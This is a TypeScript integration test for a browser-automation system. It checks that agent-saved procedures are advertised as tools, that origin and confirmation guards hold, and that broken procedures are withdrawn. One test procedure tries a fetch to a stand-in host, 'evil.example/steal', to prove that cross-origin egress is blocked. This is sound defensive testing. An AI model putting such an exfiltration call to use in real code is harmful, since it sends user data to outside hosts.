/**
 * The full lifecycle of a procedure against the live browser: saved by an
 * agent, advertised as a tool, executed, and verified by the act of running.
 * Also checks the two guards that matter — origin, and confirmation before
 * anything that changes state.
 *
 * Needs the browser stack up (chrome-personal + playwright-mcp). If it hangs,
 * the upstream is usually holding dead sessions:
 *   systemctl --user restart playwright-mcp.service
 */
import assert from 'node:assert/strict';

import { Harness, cleanup, tempMemoryDir, textOf } from '../harness.ts';

const memoryDir = await tempMemoryDir('proc');
const harness = await Harness.start(memoryDir);

await harness.call('procedure_save', {
  url: 'https://example.com',
  name: 'example_page_summary',
  description: 'Return the title and the first heading of example.com.',
  origin: 'https://example.com',
  code: 'return { title: document.title, heading: document.querySelector(params.selector || "h1")?.textContent };',
  params: [{ name: 'selector', type: 'string', description: 'Heading selector to read.', required: false }],
  expects: '{ title, heading }',
});
await harness.call('procedure_save', {
  url: 'https://example.com',
  name: 'example_dangerous_write',
  description: 'Pretends to change something; used to prove the confirmation guard.',
  origin: 'https://example.com',
  code: 'return { changed: true };',
  mutating: true,
});

// A saved procedure must appear to the agent as an ordinary tool. The tool list
// is recomputed per request, so no reconnect is needed to see a new one.
const advertised = (await harness.tools()).find(tool => tool.name === 'example_page_summary');
assert.ok(advertised, 'saved procedure must be advertised as a tool');
assert.match(advertised.description ?? '', /Not yet verified/, 'a fresh procedure must be labelled unverified');
assert.ok(advertised.inputSchema.properties?.['selector'], 'declared params must reach the schema');

// Mutating procedures must refuse to fire without explicit intent.
const refused = await harness.call('example_dangerous_write');
assert.ok(refused.isError, 'mutating procedure must refuse without confirm');
assert.match(textOf(refused), /confirm: true/, 'refusal must say how to proceed');
console.log('mutation guard holds');

// Wrong page: the origin guard must fire instead of running the code.
await harness.call('browser_navigate', { url: 'https://www.wikipedia.org/' });
const wrongOrigin = await harness.call('example_page_summary');
assert.ok(wrongOrigin.isError, 'must refuse to run on the wrong origin');
assert.match(textOf(wrongOrigin), /wrong-origin/, 'must be flagged as an origin mismatch, not a failure');
assert.match(textOf(wrongOrigin), /runs on https:\/\/example\.com but the page is on/, 'must name the expected origin');
assert.match(textOf(wrongOrigin), /not counted against the procedure/, 'must say the record is untouched');
console.log('origin guard holds');

// Right page: it runs, returns a value, and that run verifies it.
await harness.call('browser_navigate', { url: 'https://example.com/' });
const ran = await harness.call('example_page_summary');
console.log('\n--- procedure output ---\n' + textOf(ran).slice(0, 300));
assert.ok(!ran.isError, 'procedure should succeed on the right origin');
assert.match(textOf(ran), /Example Domain/, 'must return real page data');

const after = await harness.text('procedure_list', { url: 'https://example.com' });
console.log('\n--- after running ---\n' + after);
assert.match(after, /example_page_summary` · example\.com · \*\*verified\*\*/, 'a successful run must verify it');
assert.match(after, /1\/1 runs succeeded/, 'a wrong-origin call must not count as a failed run');

// The discovered interface should now list it as callable.
const iface = await harness.text('domain_interface', { url: 'https://example.com' });
console.log('\n--- discovered interface ---\n' + iface);
assert.match(iface, /Callable now/, 'a verified procedure belongs in the interface');
assert.match(iface, /example_page_summary\(selector\?: string\)/, 'the interface must show a signature');

// Two consecutive failures must withdraw it from the advertised tool list.
await harness.call('procedure_save', {
  url: 'https://example.com',
  name: 'example_always_fails',
  description: 'Throws on purpose.',
  origin: 'https://example.com',
  code: 'throw new Error("deliberate failure");',
});
for (let i = 0; i < 2; i++)
  assert.ok((await harness.call('example_always_fails')).isError, 'a throwing procedure must report an error');

assert.ok(!(await harness.toolNames()).includes('example_always_fails'),
    'a broken procedure must stop being advertised');
assert.match(await harness.text('procedure_list'), /broken/, 'but must remain visible for repair');
console.log('\nbroken procedures are withdrawn but still listed');

// Withdrawing it from the list is not the same as refusing it. An agent that
// has the name from an earlier turn could still call it and pay for the
// failure twice — once in the call, once in the detour afterwards.
{
  const again = await harness.call('example_always_fails');
  assert.ok(again.isError, 'a broken procedure called by name must be refused');
  assert.match(textOf(again), /marked broken/, 'and told why, so the agent stops trying');
  console.log('a broken procedure is refused even when called by name');
}

// The guard around a procedure must not be applied to the page itself. It used
// to assign window.fetch, XMLHttpRequest.prototype.open, navigator.sendBeacon
// and window.WebSocket on a real logged-in page, so for the life of every
// procedure the site's own polling and autosave threw.
{
  await harness.call('browser_navigate', { url: 'https://example.com' });
  await harness.call('procedure_save', {
    url: 'https://example.com',
    name: 'example_guard_scope',
    description: 'Checks that the egress guard is scoped to the procedure.',
    origin: 'https://example.com',
    // A credential-shaped identifier on purpose: prose redaction would rewrite
    // this into `const apiKey = «redacted»` and the procedure would not parse.
    code: `const apiKey = params.token || "none";
           const own = await fetch("/").then(r => r.status);
           let leak = "NOT BLOCKED";
           try { await fetch("https://evil.example/steal"); } catch (e) { leak = e.message; }
           return { apiKey, own, leak, pageUntouched: window.fetch.toString().includes("[native code]") };`,
    params: [{ name: 'token', type: 'string', description: 'ignored' }],
  });
  const out = await harness.text('example_guard_scope', { token: 'abc' });
  assert.match(out, /"own": 200/, 'a same-origin request from inside a procedure must work');
  assert.match(out, /procedure blocked from contacting/, 'a cross-origin one must not');
  assert.match(out, /"pageUntouched": true/, "the page's own fetch must be left alone");
  assert.match(out, /"apiKey": "abc"/, 'credential-shaped identifiers must survive redaction');
  console.log('the egress guard is scoped to the procedure, not the page');
}

await harness.close();
await cleanup(memoryDir);
console.log('\nPROCEDURES OK');
